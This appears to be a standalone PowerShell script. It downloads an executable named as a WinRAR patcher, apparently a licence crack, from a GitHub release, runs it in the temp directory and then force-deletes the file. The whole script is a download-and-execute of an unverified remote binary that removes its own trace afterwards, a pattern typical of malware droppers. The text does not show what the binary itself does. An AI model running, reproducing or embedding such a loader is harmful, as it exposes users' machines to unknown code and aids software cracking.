$url = "https://github.com/NoirBird/WinRAR-Patcher/releases/download/Release/NoirBird-WR-Patcher.exe"
$tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "NoirBird-WR-Patcher.exe")
Invoke-WebRequest -Uri $url -OutFile $tempFilePath
if (Test-Path $tempFilePath) {
    try {
        Start-Process -FilePath $tempFilePath -Wait
        Remove-Item -Path $tempFilePath -Force
        Write-Output "Downloaded file executed and removed successfully."
    }
    catch {
        Write-Error "Error occurred: $_"
    }
}
else {
    Write-Error "Failed to download the file."
}
